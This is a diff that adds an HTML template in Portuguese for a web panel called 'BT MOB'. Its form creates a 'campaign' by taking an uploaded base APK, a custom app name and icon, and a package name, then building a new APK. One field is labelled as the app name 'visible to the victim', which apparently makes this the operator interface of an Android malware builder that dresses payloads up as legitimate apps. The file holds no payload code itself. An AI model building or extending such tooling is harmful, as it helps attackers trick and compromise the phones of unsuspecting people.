@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BT MOB - Nova Campanha</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        .navbar {
+            background: #1a1a2e;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+        .navbar h1 {
+            color: #00ff88;
+            font-size: 24px;
+        }
+        .navbar a {
+            color: #888;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .navbar a:hover {
+            color: #00ff88;
+        }
+        .container {
+            padding: 30px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .form-card {
+            background: #1a1a2e;
+            border-radius: 10px;
+            border: 1px solid #333;
+            padding: 30px;
+        }
+        .form-card h2 {
+            color: #00ff88;
+            margin-bottom: 25px;
+            font-size: 22px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        .form-group input[type="text"],
+        .form-group input[type="file"] {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #00ff88;
+        }
+        .form-group .hint {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        .file-input-wrapper {
+            position: relative;
+            border: 2px dashed #444;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+        .file-input-wrapper:hover {
+            border-color: #00ff88;
+        }
+        .file-input-wrapper input[type="file"] {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .file-input-wrapper .icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        .btn {
+            padding: 12px 24px;
+            border-radius: 6px;
+            border: none;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn-primary {
+            background: #00ff88;
+            color: #000;
+            width: 100%;
+        }
+        .btn-primary:hover {
+            background: #00cc6a;
+        }
+        .btn-secondary {
+            background: transparent;
+            color: #888;
+            border: 1px solid #444;
+        }
+        .btn-secondary:hover {
+            color: #fff;
+            border-color: #fff;
+        }
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <h1>BT MOB</h1>
+        <a href="{{ url_for('dashboard') }}">← Voltar</a>
+    </nav>
+
+    <div class="container">
+        <div class="form-card">
+            <h2>Nova Campanha</h2>
+            <form method="POST" enctype="multipart/form-data">
+                <div class="form-group">
+                    <label for="name">Nome da Campanha</label>
+                    <input type="text" id="name" name="name" placeholder="Ex: Campanha Verão 2026" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="app_name">Nome do App (visível para vítima)</label>
+                    <input type="text" id="app_name" name="app_name" placeholder="Ex: Meu App Premium" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="package_name">Package Name</label>
+                    <input type="text" id="package_name" name="package_name" placeholder="Ex: com.meuapp.premium" required>
+                    <div class="hint">Deve ser único. Formato: com.empresa.app</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Ícone do App (PNG, 512x512)</label>
+                    <div class="file-input-wrapper">
+                        <input type="file" id="icon" name="icon" accept="image/png,image/jpeg">
+                        <div class="icon">📁</div>
+                        <p>Clique ou arraste o ícone aqui</p>
+                        <p style="color: #666; font-size: 12px; margin-top: 5px;">Opcional - usa o ícone do app base se não enviar</p>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>APK Base (seu app do Android Studio)</label>
+                    <div class="file-input-wrapper">
+                        <input type="file" id="base_apk" name="base_apk" accept=".apk" required>
+                        <div class="icon">📱</div>
+                        <p>Clique ou arraste o APK aqui</p>
+                        <p style="color: #666; font-size: 12px; margin-top: 5px;">Arquivo .apk gerado pelo Android Studio</p>
+                    </div>
+                </div>
+
+                <div class="actions">
+                    <button type="submit" class="btn btn-primary">Criar Campanha e Buildar APK</button>
+                </div>
+                <div style="margin-top: 10px; text-align: center;">
+                    <a href="{{ url_for('dashboard') }}" class="btn btn-secondary">Cancelar</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
